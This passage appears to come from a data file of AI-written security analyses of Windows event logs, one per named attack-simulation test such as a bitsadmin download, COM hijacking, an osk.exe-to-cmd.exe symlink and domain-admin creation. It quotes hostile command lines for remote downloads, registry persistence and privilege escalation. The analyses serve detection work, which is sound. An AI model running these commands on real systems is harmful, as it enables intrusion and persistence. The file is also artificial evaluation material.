This assessment considers the context of the provided logs and assumes no external context that might explain the activities logged."
Bitsadmin Download (cmd),"After analyzing the provided event logs, several key aspects of activity on the Windows host have been identified. Here is a breakdown of the notable elements:

### Suspicious and Potentially Malicious Activity:

1. **Usage of `cmd.exe` to Execute BITSAdmin**:
   - In the Sysmon log, an instance of `cmd.exe` was started with the command line: `""cmd.exe"" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin1_flag.ps1`.
   - The command attempts to download a file from the Internet using `bitsadmin.exe`, which is often used by adversaries to transfer malicious payloads or files discreetly. This behavior is indicative of a tactic often associated with malware.
   - Furthermore, the downloaded file resides in a temporary directory, suggesting attempts to execute or analyze the payload at a later stage.

2. **Process Execution by `admin_test`**:
   - Multiple processes such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were executed under `SERVER002\admin_test`, an admin-level account. `wevtutil.exe` is suspicious because it is used to manipulate event logs, potentially indicating attempts to cover tracks.
   - Each process was initiated in rapid succession, which could indicate automated or scripted actions. The absence of specific task or legitimate admin work raises questions about legitimacy.

3. **EdgeUpdate Activities**:
   - There are various events associated with `MicrosoftEdgeUpdate.exe`, including its launch from temporary directories. This can be normal during legitimate updates but may indicate tampering or misuse if unauthorized updates are triggered.
   - Analysis indicates several command-line activities involving installation and updating operations. While system file hashing and versioning checks demonstrate legitimacy, correlation with other suspicious activities must be considered to accurately assess maliciousness.

### Assessment:

- The presence of `cmd.exe` invoking `bitsadmin` for an external file download is a significant indicator of potentially malicious behavior. Although this could be part of testing or legitimate administrative tasking, without further context or prior notification, this typically warrants closer inspection.
  
- The executed processes (`wevtutil`, `conhost`, `HOSTNAME`, `whoami`) by an admin-level user seem ordinary yet could be scripted behavior designed to obscure more sinister actions.

### Recommended Guidance:

1. **Immediate Action**:
   - **Network Monitoring**: Check network logs to verify if any successful connections were made to the specified URL for potential data exfiltration or further command-and-control interactions.
   - **Behavior Investigation**: Investigate the `bitsadmin` download action further by checking if the intended file `bitsadmin1_flag.ps1` exists, and examine its contents.
   - **User Verification**: Confirm with the `admin_test` account owner whether these actions were intentional. If not, inspect for signs of account compromise.

2. **Further Analysis**:
   - **Integrity Checks**: Perform full-malware scans and integrity checks on the affected system to ensure no unauthorized changes or additional malicious payloads are present.
   - **Logging and Alerts**: Implement or verify Sysmon and log management solutions are configured to alert anomalous patterns like unusual BITSAdmin or `cmd.exe` usage.
  
### Resolution:

Based on the available information, the conclusion is **SUSPICIOUS**. The identified behavior needs more investigation to rule out or confirm potential malicious intent. It's essential to engage in swift inquiry to avert any extended system impact."
Office Application Startup - Outlook as a C2,"Upon analyzing the provided Windows event logs, the following observations have been made:

### Security Log Analysis:
- **Event ID 4616**: Indicates a change in system time. Typically, this event is generated when system time is changed intentionally or automatically. However, both events in the log show time variances corrected by milliseconds, which could be indicative of regular time synchronization or an adjustment by the Windows Time Service (W32Time).

### Sysmon Log Analysis:
- **Processes Executed**: Multiple instances of common Windows utilities (`hostname.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`, `conhost.exe`) were executed. Execution of utilities like `whoami.exe` and `hostname.exe` at high integrity might draw attention, but on its own, it is not conclusively malicious.
  
- **Suspicious `cmd.exe` Invocation (Event ID 18373)**: The command sequence executed by `cmd.exe` appears potentially harmful:
  - `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"" /t REG_DWORD /d 1 /f` is modifying the Windows Registry, which could be used to reduce security settings in Microsoft Office.
  - Using `mkdir` and `echo` operations right after it to create and possibly configure Outlook settings might point to a setup for persistence or further manipulation.

### Application Log Analysis:
- **Software Protection Platform Service**: No anomalies detected. This event log reflects standard operations from the rule engine of Microsoft’s Software Protection Platform.

### System Log Analysis:
- **Time Service and Kernel General**: Logs indicate typical time synchronization activities. Time adjustments are consistent with changes made by automated services to synchronize with time servers.

### Overall Assessment and Resolution:
Based on the reviewed logs, while there are multiple instances of processes running with a high integrity level, they are standard system and utility processes. However, the ```cmd.exe``` process executing registry modifications and file creation related to Microsoft Office Outlook security indicates potentially unauthorized use aimed at lowering security settings. This could be a sign of manipulation to facilitate payload delivery or exploitation through Outlook.

Given these findings, while concrete malicious activity (such as confirmed malware) isn't observed, the registry modification attempted through `cmd.exe` presents a suspicious element worth further investigation.

**Resolution: SUSPICIOUS**

### Guidance:
1. **Immediate Actions**: Investigate the user account `admin_test` associated with these actions for any unauthorized access or misuse.
2. **Perform Endpoint Analysis**: Conduct a comprehensive forensic investigation on the endpoint to identify any additional unauthorized changes or potential configurations indicative of persistence mechanisms.
3. **Review Network Traffic**: Check for any anomalies in the network traffic associated with this host, especially any communications outside expected or typical patterns.
4. **Enhance Monitoring**: Enable detailed logging and monitoring on registry changes, suspected user accounts, and executables invoking system-level changes.

Conclusively, while immediate malicious activity has not been confirmed, the adjustments to Outlook security settings through registry modifications present a security concern that warrants an in-depth assessment."
Create Symbolic Link From osk.exe to cmd.exe,"### Detailed Analysis of the Logs

#### System Log
- **Event ID 24 & 1 (Kernel-General):** These events indicate a change in system time. Such activity can sometimes be associated with malicious attempts to cover tracks, but in this context, it's performed using `svchost.exe`, a legitimate Windows service application. The time change seems to be related to a time synchronization with `time.windows.com`, which is normal.
- **Event ID 35 (Time-Service):** The time source was chosen as `time.windows.com`, confirming the time was set via Network Time Protocol (NTP), which appears legitimate.

#### Sysmon Log
- **Execution of Common Windows Executables:** Events show the execution of common, benign processes like `hostname.exe`, `conhost.exe`, `whoami.exe`. These executables are standard in administration contexts.
- **Suspicious Command Execution:**
  - The command line for `cmd.exe` includes `takeown`, `icacls`, and `mklink` operations on `osk.exe`, replacing it with `cmd.exe`. This technique is commonly used for privilege escalation attacks by replacing a legitimate executable with a malicious one.
  - The files involved (`osk.exe`, `cmd.exe`) and operations performed (ownership change, file deletion, symlink creation) are highly indicative of an attempt to gain unauthorized privileges, possibly part of a UAC bypass technique.
- **Wevtutil Activity:** Multiple executions of `wevtutil.exe` are noted. While this is a legitimate tool to manage event logs, its frequent invocation can be associated with attempts to clear logs or export them excessively, which suspiciously coincides here with the `wevtutil` process.
  
#### Security Log
- **Event ID 4672 and 4624:** These indicate a privileged logon session and NTLM authentication, respectively. The user `admin_test` had elevated privileges, which might explain some of the actions taken but also raises concern if this user was not expected to perform such operations.
  
#### Application & Windows PowerShell Log
- **Sparse Entries:** The uploaded logs do not indicate activities directly associated with PowerShell scripts or applications running suspiciously.

### Assessment
Based on the analysis, there is one particularly concerning activity: the `cmd.exe` operation that manipulates system files (`osk.exe`). This operation suggests a likely privilege escalation attempt by an unknown attacker or a malicious insider leading to potential system compromise.

### Resolution
The behavior observed in the logs aligns with common attack patterns, including file manipulation for privilege escalation. Thus, the conclusion of this analysis is classified as:

**MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Response:**
   - Isolate the machine from the network to prevent further attacks or exfiltration of data.
   - Conduct a full forensic investigation to understand the extent of the compromise.
   - Change all passwords, especially for accounts with administrative privileges.

2. **Long-term Measures:**
   - Review and enhance the current security policies, including the use of restrictive Access Control Lists (ACLs) and mandatory use of Multi-Factor Authentication (MFA).
   - Enable and ensure proper logging for all critical actions and regularly review logs.
   - Educate users about the risks associated with privileged access and usage.

By taking these steps, the risk of further malicious activity can be minimized, and the system's integrity can be restored."
Netsh Helper DLL Registration,"Based on the analysis of the provided Windows event logs, I have identified the following key observations:

1. **Presence of potentially suspicious PowerShell activity**: 
   - Unfortunately, there is no detail for PowerShell logs provided in the event logs section. Therefore, it's not possible to determine if any malicious scripts were executed via PowerShell.

2. **Sysmon logs indicating unusual command execution**:
   - The Sysmon logs show a command being executed using `cmd.exe` that includes the addition of a NetshHelper DLL located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\NetshHelper.dll`). This kind of activity is often associated with lateral movement tools, persistence mechanisms, or other malicious activities used to maintain a foothold on a compromised system.
   - `cmd.exe` is also used to kill a `notepad.exe` process forcefully `/t /f`, which may indicate scripting or automation that could be related to a malicious payload's cleanup activity to remove traces.

3. **Microsoft Edge Update-related activities**:
   - Regular execution of Microsoft Edge-related update processes is indeed visible within the logs. These activities likely relate to legitimate software update mechanisms managed by the operating system.

4. **Use of system utilities**:
   - There are entries for operations using known Windows binaries such as `wevtutil.exe` and `hostname.exe`, which are generally not inherently suspicious. However, their execution in combination with potentially malicious behavior could be of interest.

5. **General high integrity activities by the `SERVER002\admin_test` user**:
   - Several processes run with ""High"" integrity level, which indicates they are potentially sensitive operations that could be exploited.

### Recommendations:
- **Immediate Investigation of the DLL Injection**: The addition of a helper DLL by command line in a non-standard location is highly suspicious. This operation should be closely checked for legitimacy, and if found malicious, a deeper forensic investigation should be initiated to identify the payload and its origin.
- **Examine the User Activities**: User `SERVER002\admin_test` initiates many of these processes, which have a potential link to the suspicious activities. Verification of this user's actions and authentication logs around these timestamps is important to ensure that the account has not been compromised.
- **Review System Patches and Security Tools**: Ensure that Defender or other antimalware tools are up to date and conduct a full scan across the system.
- **Network Monitoring**: Consider raising network-level inspection for IPs or domains related to the `NetshHelper.dll` if identified as malicious, to prevent further communication that might be related to this activity.

### Resolution:
- **SUSPICIOUS**: The command-line argument used with `cmd.exe` to load an unlabeled DLL, along with the aggressive stopping of processes, is suspicious. However, further investigation is required to determine if this activity is malicious. There is a need for further evidence collection, system scan results, and possibly post-intrusion detection efforts to ascertain the full scope of the activity."
Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"After analyzing the provided Windows event logs, I have identified several notable points that indicate malicious activity. Here's the breakdown of the analysis per log:

### **System Log**
1. Series of time change events (EventID 1) involving `svchost.exe`. While time change events can be part of routine operations, they can also be used to manipulate event logs to hide malicious activities, but they seem to be related to network time protocol synchronization.

### **Sysmon Log**
1. **Process Execution of `cmd.exe`**: 
   - The execution of `cmd.exe` with the command-line arguments that modify the Windows registry is an indicator of malicious activity.
   - Specifically, the registry keys added under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test` look highly suspicious. It seems like an attempt to set up a persistence mechanism via registering an assistive technology callback using `atbroker`.

2. **Processes Executed by `cmd.exe`**: 
   - Execution of `reg.exe` under `cmd.exe` with commands to add registry keys further supports evidence of malicious intent.
   - Use of `AtBroker.exe` to potentially run the registered malware, which suggests an exploit attempt or persistence mechanism.

### **Security Log**
1. **Time Change Events (EventID 4616)**:
   - Reflects the time-skew activities similar to what was observed in the System log. Potentially benign if tied to routine operations but combined with Sysmon log entries suggest otherwise.

### **Application Log**
1. No direct evidence of anomalous activity was observed.

### **General Assessment and Threats**
- The execution of registry modification commands under `cmd.exe` and the use of accessibility tools (like `AtBroker.exe`) strongly indicate malware activity — likely a persistence technique or to escalate privileges.
- `whoami.exe` and `conhost.exe` executions appear normal for the displayed context and normally do not yield malicious activities on their own; however, the processes associated with the registry modifications and use of `AtBroker.exe` are suspicious.
- The presence of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) appears to be a standard and legitimate activity on the system.

### **Final Conclusion**

**Resolution: MALICIOUS**

The logs show evidence of potentially harmful registry modifications leveraged by `cmd.exe`, pointing towards the installation and execution of malicious activities or malware. Immediate steps should be taken to isolate the system from the network, conduct a thorough malware scan and potentially clean or rebuild the system to ensure no persistence mechanisms remain in place. Additionally, review and apply security patches and strengthen policies against misuse of assistive technologies for malicious purposes."
COM hijacking via TreatAs,"Based on the analysis of the provided logs, there are several indicators suggesting malicious activity on the Windows host, Server002. Here is a detailed breakdown:

### Indicators of Malicious Activity:
1. **Registry Manipulations via PowerShell**:
    - The Windows PowerShell logs show a series of registry modifications targeting keys under `HKEY_CURRENT_USER\SOFTWARE\Classes\`. This includes creating class identifiers (CLSIDs) and setting keys related to `InprocServer32` and `ScriptletURL`. 
    - The registry modifications are intended to load `scrobj.dll` and execute a script from a remote URL (`https://github.com/file/file-file/raw/master/files/data.015/src/TreatAs.sct`). This pattern is consistent with a tactic used in Trojan attacks where a scriptlet URL is leveraged to download further payloads.

2. **Use of `rundll32.exe`**:
    - The command `rundll32.exe -sta ""fileTest""` is executed, which suggests the attempt to manipulate COM objects or load malicious DLLs. This is a common technique used by attackers to execute code in the system context stealthily.

3. **Suspicious PowerShell Execution**:
    - The PowerShell command lines indicate scripted instructions performing these actions which are not typical for regular administrative tasks, suggesting automated or scripted changes by an attacker.

4. **Sysmon Logs**:
    - The Sysmon logs provide details of process creation and reveal that all the registry operations are executed by a process traced back to `WindowsPowerShell`. 
    - The consistency in usage of registry commands indicates a scripted or batch operation, raising the suspicion of automated behavior typically utilized in malware deployment.

5. **Anomalous Use of System Tools**:
    - While `rundll32.exe` and registry access are legitimate system tools and actions, their combination with external scripts and the running context indicate potential misuse by a threat actor.

6. **Lack of Normal Operations**:
    - There are no corresponding legitimate administrative tasks or logging indicating these actions are expected or approved system changes, enhancing suspicion.

### Assessment:
- All these activities, particularly registry modifications and the execution of `rundll32.exe` targeting potentially harmful DLL loading or external script downloading, present a high security risk. They align with known malicious techniques, such as direct COM hijacking and download-execute methods.

### Resolution:
- **MALICIOUS**: The activity identified in the logs is consistent with malicious behavior designed to establish persistence or conduct remote code execution using PowerShell and system utilities. This requires immediate action to contain and remediate the threat.

### Guidance:
1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent any further potential spread of malicious activity.
2. **Detailed Investigation**: Conduct a comprehensive forensic investigation on the affected system to trace the source of the malicious PowerShell script and determine the extent of compromise.
3. **Removal of Persistence**: Remove unauthorized registry entries, particularly those associated with the identified CLSIDs.
4. **Monitoring and Prevention**: Enhance monitoring capabilities and deploy preventive measures against similar behavior, including tightening PowerShell execution policies and maintaining updated threat intelligence for script-based threats.
5. **Review Security Policies**: Ensure system configurations and user permissions are optimized to reduce the risk of privilege abuse often leveraged in such attacks."
Adding custom debugger for Windows Error Reporting,"After analyzing the provided Windows event logs, here is a detailed analysis:

1. **System Log Analysis:**
   - The logs indicate several time synchronization events involving `svchost.exe`, which are common for NTP (Network Time Protocol) synchronization activities. These events are not inherently suspicious unless they are excessive or unexpected in frequency.

2. **Sysmon Log Analysis:**
   - The execution of `HOSTNAME.EXE`, `conhost.exe`, and `whoami.exe` under the user `admin_test` with high integrity level via `wsmprovhost.exe` is observed. These processes are legitimate Windows operations and seem to be executed from a user with admin privileges.
   - The command `cmd.exe` executing `reg add` to alter a registry key under a high privilege account is particularly notable. This command is modifying the debugger for Windows Error Reporting, redirecting it to `notepad.exe`. Such registry changes are often suspicious as they might be employed to intercept or subvert error reporting mechanisms.

3. **Security Log Analysis:**
   - The time change events by `svchost.exe` are consistent with the NTP activities observed in the System logs and do not appear suspicious in context.

4. **Application Log Analysis:**
   - The `Software Protection Platform Service` log indicates a routine event related to protection rules, which does not raise immediate concerns.

5. **Potential Malicious Indicators:**
   - The registry modification that occurs using `cmd.exe` to change a debugger path via the registry (`HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\Debugger`) is unusual for a typical administrative operation and can be indicative of malicious attempts for persistence or subverting the normal error handling processes.

**Overall Assessment:**
- The majority of the logged events appear to be benign, related to legitimate process executions and system operations.
- The execution of commands altering registry keys to redirect the debugger is the primary indicator of potentially suspicious activity as it deviates from normal operation expectations.

**Resolution: SUSPICIOUS**
- This activity does not explicitly confirm malicious activity but it is a strong indicator that warrants further investigation. The execution context, intent, and impact of the registry modification should be assessed further.
- Recommended actions include a deeper investigation into recent administrative changes or scripts executed by `admin_test`, and monitoring any anomalous behavior related to application crashes or debugging. If possible, reverting the registry change and enhancing monitoring could serve to prevent potential misuse."
Powershell Execute COM Object,"Upon reviewing the provided Windows event logs, several indicators point towards suspicious and potentially malicious activities. Here is a detailed analysis:

1. **Time Change Events (Security Logs - Event ID 4616)**:
   - There are events indicating that the system time was changed, which is often an indication of attempted subversion of time-based security controls or logs tampering. Legitimate reasons for time changes via LOCAL SERVICE using `svchost.exe` might exist, but it raises a flag if correlated with other suspicious activities.

2. **Administrative Privilege Use (Security Logs - Event ID 4672 & 4624)**:
   - The user ""admin_test"" is observed performing actions with high privileges, such as `SeDebugPrivilege` and `SeImpersonatePrivilege`, which are commonly misused in attacks.
   - Several logons (Event ID 4624) from the IP address `192.168.0.102` using ""admin_test"" with NTLM authentication, suggest a remote connection, and NTLM may indicate a lack of more secure methods like Kerberos.

3. **Unusual Command Execution (Sysmon & PowerShell Logs)**:
   - A PowerShell command is executing what seems to be a COM object leading to `cmd.exe` launching `calc.exe`. This is notably suspicious as it is often indicative of an exploit or pen-testing action attempting to escalate privileges, leverage lateral movement, or establish persistence.
   - The aforementioned PowerShell command uses a CLSID (9BA05972-F6A8-11CF-A442-00A0C90A8F39) to create a COM object instance usually linked to scripting or automation, which could be leveraged for malicious purposes.

4. **Sysmon Logs - Unusual Process Behavior**:
   - Multiple executions of `wevtutil.exe` by ""admin_test"", which is primarily used for accessing the event logs obscured as legitimate operation but can be used by attackers to tamper with event logs.
   - Frequent executions of `conhost.exe` and commands like `whoami.exe` indicate reconnaissance activities by the user ""admin_test"".

Overall, the activities within these logs display clear signs of compromise or unauthorized activity. The combination of time changes, high privilege usage, remote logins, and the execution of atypical PowerShell scripts suggests a potential malicious actor exploiting the system for unauthorized access or escalation.

**Resolution: MALICIOUS**

**Guidance**:
1. **Containment and Eradication**: Immediately isolate the affected host from the network to prevent further spread. Clear all suspicious accounts and reset passwords for any users potentially impacted.
   
2. **Forensic Analysis**: Conduct a thorough forensic investigation to determine the full scope of the breach, including timeline and method.
   
3. **Patching and Hardening**: Review and apply necessary patches, remove unnecessary privileges, and ensure logging captures all security-relevant events.

4. **Monitoring and Detection**: Implement enhanced monitoring and detection mechanisms to identify similar activities in real-time across the network.
   
5. **Incident Response Plan**: Review and update the incident response plan to incorporate lessons learned from this investigation."
Registry key creation and-or modification events for SDB,"Based on the analysis of the Windows event logs provided, here is a detailed examination of the activities observed:

### Application Log Analysis:
1. **EdgeUpdate Service Stopped:** There are two events indicating that the EdgeUpdate service stopped within short intervals. The stopping of services is common but repeated stops could be indicative of an issue if it's a non-standard or unexpected behavior. However, without further context, this alone is not necessarily malicious.

2. **Microsoft-Windows-Security-SPP:** This event logs activity related to software protection services. There is no direct indication of malicious activity from this entry as it appears to be a routine check or update.

### System Log Analysis:
1. **Kernel-General and Time-Service Events:** There are events related to time zone adjustments and time synchronization. While changes in system time can sometimes indicate malicious activity (like attempts to alter logs), the presence of Microsoft-Windows-Time-Service entries suggests these are due to standard time synchronization processes.

### Sysmon Log Analysis:
1. **PowerShell Command Execution:** There is a Sysmon log indicating the use of PowerShell with a command that modifies registry keys, specifically, within the `AppCompatFlags` path in the HKLM registry hive. This is suspicious since modifications to these keys are often monitored, especially if the changes are occurring in a manner consistent with persistence or evasion techniques.

2. **Host Activity:** Multiple legitimate system processes are executed (e.g., HOSTNAME.EXE, whoami.exe, conhost.exe). These activities mostly involve querying host information and do not inherently indicate malicious intent without accompanying suspicious actions.

3. **Edge Update Activity:** There are several entries concerning Microsoft Edge Update processes, which appear to be routine updates. The numerous entries indicate Edge being updated, registered, and installation activities being conducted, which again, if expected, would not be immediately suspicious.

### Windows PowerShell Log Analysis:
- **Script Execution:** Logs contain evidence of registry modification commands being executed via PowerShell. The command attempts to make properties under `AppCompatFlags` which may indicate unauthorized configuration changes aimed at altering application compatibility flags, hinting at potential attempts to employ persistence mechanisms or other configuration changes usually seen in advanced persistent threat scenarios.

### Security Log Analysis:
- **Privilege Assignments:** A logon session for user `admin_test` shows a high privilege set (e.g., `SeDebugPrivilege`, `SeLoadDriverPrivilege`). While these privileges are necessary for administrative tasks, they present a significant risk if abused, especially when aligned with malicious activity.

### Assessment & Conclusion:
- The PowerShell execution that modifies registry keys, especially on paths associated with application compatibility, is a red flag for potential malicious activity. When coupled with the use of high privileges, it is significant.
- No strongly corroborating signs of malware (e.g., unusual hashes, non-Microsoft binaries, etc.) appeared specifically in the logs, but the presence of registry changes without a clear legitimate purpose is concerning.

**Resolution**: **SUSPICIOUS**
- The activities in the logs, particularly the usage of PowerShell to modify registry entries in `HKLM`, represent suspicious behavior that merits further investigation to determine the intent and to verify the legitimacy of these actions. Additional steps should include reviewing access logs around these entries, verifying the purpose of registry modifications, and verifying other changes in the environment that align with these timestamps."
Create a new Windows domain admin user,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made:

1. **System Logs & Time Adjustment:**
   - The logs indicate that the system time was adjusted multiple times around 13:11:05, involving typical processes such as `svchost.exe`. This might relate to routine time synchronization tasks, commonly seen with network time protocol (NTP) services. There is no clear indication that these adjustments are malicious.

2. **Application Logs:**
   - The logs indicate the stopping of the ""edgeupdate"" service, which might be part of regular software update and maintenance actions. There are no suspicious activities noted specific to this.

3. **Sysmon Logs:**
   - Several Sysmon events show the execution of typical Windows utilities such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`, primarily by the user `SERVER002\\admin_test`. While utilities like `whoami` and `hostname` help quickly understand the system environment, frequent use might indicate scripting or automated administrative tasks. However, the presence of a command line execution with `cmd.exe` to add a user (`data.002_Admin`) to the domain admins group is concerning.
   - The command executed was: `""cmd.exe"" /c net user ""data.002_Admin"" ""data_pass123!"" /add /domain & net group ""Domain Admins"" ""data.002_Admin"" /add /domain`. This action can demonstrate unauthorized privilege escalation, and it indicates a potential security breach.
   - The Sysmon logs also show a series of updates related to the `Microsoft Edge Update`, which seem routine given the context.

4. **Security Logs:**
   - There are login and privilege escalation events involving the `admin_test` account. A security event with Event ID 4672 indicates special privileges were assigned to this account, which is consistent with attempted or successful elevation of privileges. 

**Assessment:**
- The key concern is the unauthorized addition of a user account with domain admin privileges, which is a red flag for potential malicious activity involving privilege escalation and lateral movement.

**Threats or Risks Identified:**
- Privilege escalation attempt by adding a new account to the Domain Admins group without clear authorization could indicate the presence of an attacker or malicious insider activity.

**Recommended Actions:**
1. **Immediate Further Analysis:**
   - Investigate the `admin_test` account's recent activity and credentials to verify if they were compromised.
   - Check for additional unauthorized user accounts or unexpected group memberships.

2. **Remediation and Monitoring:**
   - Revoke any unauthorized privileges or accounts immediately.
   - Monitor systems closely for any further suspicious activities.
   - Consider implementing stricter privilege management controls and logging.

3. **Incident Response:**
   - Engage with your incident response team to investigate the scale of the breach and its impact.
   - Determine the initial vector of compromise and identify any potential breaches in security protocols or configuration.

**Resolution: MALICIOUS**
- The logs provide clear indicators of unauthorized actions indicative of a security compromise. This warrants immediate response and rectification efforts to mitigate and eliminate the threat."
HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"Upon careful investigation of the provided Windows event logs, here are my detailed findings:

### Suspicious and Anomalous Behavior Identified:

1. **Use of PowerShell to Modify Registry AutoRun Key:**
   - There is a Windows PowerShell event with a command line that uses `New-ItemProperty` to set the `AutoRun` registry key to execute `notepad.exe`. This is unusual and often associated with persistent malware or unauthorized configurations to ensure a specific program runs automatically on startup. The command line is:
     ```
     powershell.exe & {New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""}
     ```

2. **Unusual Time Sync Behavior:**
   - There is a noticeable change in the system time as recorded in the Security log and System log. This can be often linked to attempts to manipulate logs or timestamps, which might signify that someone was trying to cover tracks or disrupt normal operations.

3. **System Integrity Level Processes:**
   - The majority of events involving `MicrosoftEdgeUpdate.exe` and related processes run under `NT AUTHORITY\SYSTEM`. This is typical behavior for system-level updates, but the frequency and persistence of such events in a short timeframe could suggest a misuse if these updates were maliciously triggered.

### Potential Malicious or Compromising Activity:

- The use of PowerShell to modify critical system settings such as the registry AutoRun is a strong indicator of potentially malicious activity. This modification technique is commonly used by attackers to establish persistence on a system. Although the command itself sets `notepad.exe` to run at startup, which might seem benign, the method used raises concerns due to its potential for abuse with more harmful payloads.

### Conclusion and Assessment:

After analyzing the logs, I have identified both benign and potentially suspicious activities. The manipulation of the AutoRun registry entry via PowerShell stands out as the most significant anomalous behavior, warranting further investigation to rule out malicious intent.

### Resolution:

**SUSPICIOUS** - The activity involving PowerShell and registry modification appears suspicious. It is recommended to investigate the context of these events further, potentially examining any user actions or scripts that may have triggered this event, and ensuring there is no unauthorized software attempting to establish persistence on the system. Additionally, it would be prudent to scan the system for malware and review user permissions and recent account activities."
Change Default File Association,"Based on the provided Sysmon and Application logs, here is a detailed analysis of the events:

1. **Normal Windows Operations:**
   - **Microsoft Edge Update Process:**
     - Multiple entries show the execution of `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe` with `NT AUTHORITY\SYSTEM` as the user. These processes are part of normal Microsoft Edge updating activities, which are expected to run under SYSTEM privileges to perform the update.

2. **Command Line Execution:**
   - **Cmd.exe Execution:**
     - There is an entry indicating `cmd.exe` executing with a command line `\""cmd.exe\"" /c assoc .hta=txtfile`. This indicates a modification of file associations which could be benign or potentially malicious depending on context. While such activity can be related to legitimate administrative or application setup tasks, it can also be an indicator of a script or malware attempting to change file associations to execute malicious payloads.

3. **Suspicious Command:**
   - The specific command to associate the .hta file extension with `txtfile` might be suspicious as HTA files (HTML Application) can be used for executing HTML and script code, which can be abused for malicious purposes. This change might be used to prevent normal HTA execution or to exploit it for running a script.

4. **Processes with Elevated Privileges:**
   - **WHOAMI and CONHOST Executions:**
     - WHOAMI is used to display user information, and its execution, along with `conhost.exe`, might be benign or usage by an admin. Frequent and repeated use by a non-administrative user may be suspicious but lacks additional context here to raise a red flag.

5. **Process Creation without Anomalies:**
   - **Significant processes executed under SYSTEM authority:**
     - The overall execution of known Microsoft processes under SYSTEM authority, such as Edge updates, appears normal.

**Assessment and Guidance:**
- The observed command line execution involving file association changes through cmd.exe is noteworthy. It could be a benign activity, possibly related to file management scripts or utilities. However, due to the potential misuse of `.hta` files in malware activities, this entry merits further investigation.
- Investigate the context of `cmd.exe` usage, especially the origin of the command and the rationale for adjusting file associations.
- Consider exploring whether there have been any recent related security alerts or if any unusual network or file access patterns are present in conjunction with these activities.

**Final Resolution: SUSPICIOUS**
- While most activities point to benign, expected operations (primarily Microsoft Edge updates), the cmd.exe execution targeting `.hta` associations warrants additional investigation to ensure it is not part of a more extensive malicious activity. It's prudent to validate these logs against other sources or alerts for comprehensive assessment."
Install Outlook Home Page Persistence,"### Analysis of the Windows Event Logs

#### System Log Analysis

The system log entries appear to focus primarily on time changes and adjustments performed by `svchost.exe`:

- **Event ID 24** and **Event ID 1** from `Microsoft-Windows-Kernel-General` indicate normal activities related to time adjustment and system internals.
- `svchost.exe` is repeatedly adjusting system time, syncing with `time.windows.com`. This is standard behavior and consistent with Windows Time Service operations.

Upon inspection, there is nothing overtly suspicious about these entries; the time updates seem routine and the `svchost.exe` process is a legitimate Windows process.

#### Security Log Analysis

The security logs generally track audited activities, in this case `Event ID 4616`, documenting system time changes:

- Changes are carried out by the `LOCAL SERVICE` account (`User SID S-1-5-19`), which is typical for time adjustments.
- `ProcessName` is `svchost.exe`, a common host process for services in Windows.

These entries all appear legitimate, tying back to the system log details without indicating any sign of compromise.

#### Sysmon Log Analysis

The Sysmon logs provide information about processes being created with command line details:

- Multiple instances of `wevtutil.exe` and `conhost.exe`, often seen together, could indicate script execution behavior, but they are used correctly here.
- Execution of common utilities (`whoami`, `hostname`, `cmd`) are legitimate. However, there is a notable command execution:
  - `cmd.exe` running a command to modify the registry path: `reg.exe add HKCU\Software\Microsoft\Office\16\Outlook\WebView\Inbox`.

The modification of the registry to include a URL pointing to a local HTML file (`data.004.html`) does raise suspicion. It could represent a form of persistence method (auto-start/auto-load settings), especially if associated with Outlook. The command's execution through `cmd.exe` further suggests scripted or automated attempts at changing system settings which commonly correlates with malicious activity or unauthorized modifications. 

#### PowerShell and Application Log Analysis

No relevant PowerShell or Application logs were provided for analysis.

### Conclusion

1. **Suspicious Activity**
   - The command executed by `cmd.exe` to modify the registry stands out as potentially harmful or unwanted behavior. While not overtly malicious on its own, it is uncommon activity and warrants review.

2. **Recommendation**
   - Investigate the origin of the command modification to the registry.
   - Review the content and purpose of the `data.004.html`.
   - Validate any legitimate need for this registry configuration.
   - Monitor for additional changes or related activity.

### Resolution

**SUSPICIOUS**: The logs contain activity that doesn't align with typical user or system operations, indicating the need for a deeper investigation to rule out malicious intent or compromise."
GlobalFlags in Image File Execution Options,"**Detailed Analysis:**

Upon reviewing the logs provided, the following entries stand out as potentially suspicious or indicative of malicious activity:

**1. PowerShell Logs & Event Logs:**
   - The PowerShell logs show command-line execution that involves modifying registry settings for `whoami.exe` using `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. This type of registry modification is unusual and may be indicative of an attempt to manipulate behavior or execute something stealthily via Image File Execution Options (IFEO), a known technique for persistence or privilege escalation.
   - The command line in the PowerShell logs is particularly concerning because it includes commands to execute a process upon the silent exit of `whoami.exe`. Specifically, it sets a `MonitorProcess` to execute `cmd.exe /c calc.exe`. While opening the calculator is not harmful by itself, the technique of using IFEO for process triggering suggests an attempt to hide real intentions.

**2. Execution of System Utilities:**
   - There are frequent executions of common system utilities like `hostname.exe`, `conhost.exe`, `whoami.exe`, `wevtutil.exe`, and especially `powershell.exe` in a short amount of time. This pattern of using utilities in succession can indicate an automated script, possibly performing reconnaissance or setting up for further malicious actions.
   - The sequence includes spawning `whoami.exe` from a PowerShell process that has been manipulated to trigger other actions silently, which aligns with potential misuse for covert operations.

**3. High Integrity Level Processes:**
   - Many processes initiated have a High integrity level, which could indicate privilege escalation. The concern arises especially in conjunction with PowerShell execution performing potential registry changes and triggering other processes.

**4. Edge Update Service:**
   - The processes related to `MicrosoftEdgeUpdate.exe` seen in the Sysmon logs appear to be standard system updates, although their timing coincides with suspicious PowerShell and registry activities. The routine nature of update operations should be cross-checked with expected update schedules to ensure no misuse.

**Assessment:**
